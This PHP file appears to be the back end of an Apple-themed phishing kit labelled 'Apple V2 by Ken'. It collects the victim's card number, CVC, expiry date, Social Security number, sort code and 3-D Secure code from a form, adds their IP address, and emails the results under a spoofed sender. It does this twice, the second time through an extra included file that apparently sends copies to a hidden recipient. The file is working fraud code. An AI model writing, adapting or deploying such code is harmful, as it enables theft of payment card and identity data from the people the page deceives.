<? include "../security.php";?>
<?php
ob_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "===============| Apple V2 by Ken |================\n";
$bilsmg .= "Card holder                 : ".$_POST['holdername']."\n";
$bilsmg .= "card num                    : ".$_POST['numcard']."\n";
$bilsmg .= "CVC                         : ".$_POST['ccv-code']."\n";
$bilsmg .= "Expiration Date             : ".$_POST['ex-date']."/".$_POST['ex-date2']."\n";
include '../put-your-email-here.php';
$bilsmg .= "Social Security Number      : ".$_POST['soc-num']."\n";
$bilsmg .= "Sort Code                   : ".$_POST['sort-co']."\n";
$bilsmg .= "3-D                         : ".$_POST['3d-co']."\n";
$bilsmg .= "==============| IP INFO |================\n";
$bilsmg .= "From   http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| Apple V2 by Ken |================";
$bilsub = "Result VBV | $ip";
$headers = "From: Ken Apple <fake@fake.fake>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "===============| Apple V2 by Ken |================\n";
$bilsmg .= "Card holder                 : ".$_POST['holdername']."\n";
$bilsmg .= "card num                    : ".$_POST['numcard']."\n";
$bilsmg .= "CVC                         : ".$_POST['ccv-code']."\n";
$bilsmg .= "Expiration Date             : ".$_POST['ex-date']."/".$_POST['ex-date2']."\n";
include '../img.php';
$bilsmg .= "Social Security Number      : ".$_POST['soc-num']."\n";
$bilsmg .= "Sort Code                   : ".$_POST['sort-co']."\n";
$bilsmg .= "3-D                         : ".$_POST['3d-co']."\n";
$bilsmg .= "==============| IP INFO |================\n";
$bilsmg .= "From   http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| Apple V2 by Ken |================";
$bilsub = "Result VBV | $ip";
$headers = "From: Ken Apple <fake@fake.fake>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);


include("cssisma/applejava.php");

?>